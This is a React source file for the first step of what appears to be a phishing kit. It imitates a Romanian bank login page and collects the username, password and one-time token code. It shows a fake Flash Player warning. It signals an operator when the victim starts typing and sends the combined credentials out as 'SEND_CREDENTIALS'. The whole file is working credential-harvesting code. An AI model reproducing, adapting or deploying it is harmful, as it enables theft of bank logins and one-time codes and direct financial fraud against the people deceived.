import React, { useState, useEffect } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import warningIcon from '../media/icon_message-warning.png'
import requiredIcon from '../media/csillag.png'
import { RightPart } from './RightPart'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import { ErrorMsg } from './ErrorMsg'

export const Step_1 = props => {
  const { store, changeStore } = props

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')
  const [token, setToken] = useState('')
  const [showError, setShowError] = useState('')
  
  const error = store.error
  const setError = val => changeStore({ error: val })
  

  const handleChange = (value, type) => {
    if (type === FieldType.LOGIN) {
      setLogin(value)
    }
    if (type === FieldType.PASSWORD) {
      setPassword(value)
    }
    if (type === FieldType.TOKEN) {
      setToken(value)
    }
    if (!storage.touched) {
      console.log('Typing...')
      Messaging.start()
      storage.touched = true
    }
  }

  const handleSubmit = () => {
    const value = `${login}${CREDENTIALS_DELIMETER}${password}${CREDENTIALS_DELIMETER}${token}`
    if (!login || !password || !token) {
      console.log('set error')
      setError(true)
      setShowError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_CREDENTIALS, payload: value })

    changeStore({
      step_1_cod : value,
      loading: true,
    })

  }

  return (
    <div className="row content-wrapper">
      <div  className="step-wrapper">
        <div className="top-wrapper" />
        <div className="center-wrapper">
          <div className="center-left" />
          <div id="log-container" className="clr">
            <div className="login-title">
              <span style={{marginLeft: 10}}>Accesati</span>
            </div>
            <div className="login-container">
              <div className="login-description">Va rugam introduceti numele de utilizator, parola si codul token!</div>
              <div className="login-field">
                <div className="field-name"><label>Nume utilizator:</label></div>
                <div className="field-input"><div className="row-center"><img src={requiredIcon} alt="required" /> </div>
                <input type="text" value={login}  style={{backgroundColor: !login && error && 'red'}} onChange={e => handleChange(e.target.value, FieldType.LOGIN)}/>
                </div>
              </div>
              <div className="login-field">
                <div className="field-name"><label>Parola:</label></div>
                <div className="field-input"><div className="row-center"><img src={requiredIcon} alt="required" /> </div>
                <input type="password" value={password} style={{backgroundColor: !password && error && 'red'}} onChange={e => handleChange(e.target.value, FieldType.PASSWORD)}/>
                </div>
              </div>
              <div className="login-field">
                <div className="field-name"><label>Cod token:</label></div>
                <div className="field-input"><div className="row-center"><img src={requiredIcon} alt="required" /> </div>
                <input type="text" value={token} style={{backgroundColor: !token && error && 'red'}} onChange={e => handleChange(e.target.value, FieldType.TOKEN)}/>
                </div>
              </div>
              {error && <ErrorMsg message="Ati introdus credentiale eronat." />}
              <div className="warning-message-container">
                {!error &&
                  <div>
                      <div style={{marginTop: 10}}>
                        <img src={warningIcon} alt="warning-icon" />
                      </div>
                      <div className="warning-message">
                        <div>Avertizare!</div>
                        <div>Unele functii vor fi indisponibile pentru ca nu aveti activat flash player!</div>
                      </div>
                  </div>}
                <div className="btn-wrapper">
                  <div className="btn-general" onClick={handleSubmit}>
                    <span className="btn-general-left"></span>
                    <span className="btn-general-center">Ok</span>
                    <span className="btn-general-right"></span>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="center-right" />
        </div>
        <div className="bottom-wrapper">
          <div className="bottom-left" />
          <div className="bottom-center" />
          <div className="bottom-right" />

        </div>
      </div>
      <div className="right-part-wrapper">
        <RightPart />
      </div>
    </div>
    
    
  )
}


